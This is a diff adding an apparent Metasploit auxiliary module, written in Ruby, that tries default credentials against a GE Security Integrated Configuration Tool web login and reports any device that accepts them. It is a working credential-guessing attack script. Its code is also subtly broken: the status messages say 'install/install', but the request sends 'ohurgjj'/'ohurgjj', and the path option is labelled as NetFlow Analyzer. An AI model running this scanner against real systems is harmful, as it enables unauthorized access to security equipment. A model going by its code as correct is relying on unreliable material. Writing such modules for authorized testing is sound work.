@@ -1,0 +1,74 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+  include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
+
+  def initialize
+    super(
+      'Name'        => 'GE Security - Integrated Configuration Tool - Default Login',
+      'Description' => %q{
+        This module attempts to login to a GE Security - Integrated Configuration
+        Tool web application using the default username and password. 
+        Tested on version 124.00.01.         
+      },
+      'Author'      => 'Scott Sutherland (@_nullbind)',
+      'License'     => MSF_LICENSE
+    )
+
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptString.new('TARGETURI',
+          [ true, "The base path to NetFlow Analyzer", '/cgi-bin/Dataframe.cgi' ]),        
+      ], self.class)
+  end
+
+
+  def run
+
+    # Create HTTP request
+    begin
+      print_status("#{peer} - Testing default credentiasl - install/install")
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => datastore['TARGETURI'],
+        'vars_get'     => {
+          'userName' => 'ohurgjj',
+          'passWord' => 'ohurgjj',
+          'referring_page' => '0',
+          'html_version' => '124.00.01'                    
+        }#,
+        #'vars_post' => { 
+        #  'name' => name, 
+        #  'code' => encoded_value 
+        #},
+        #'cookie'        => {
+        # 'operation' => 'COPY',
+        #}
+      })
+
+
+      # Check server response for success   
+      res.inspect        
+      if (res and res.code == 200 and res.body.match(/Logon accepted/))
+        print_good("#{peer} - Found default credentials - install/install")
+      else
+        print_error("#{peer} - No default credentials - install/install")
+      end     
+
+
+      # Connection fail
+      rescue Rex::ConnectionError
+        print_error("#{peer} - Could not connect.")
+      return
+    end
+  end
+end
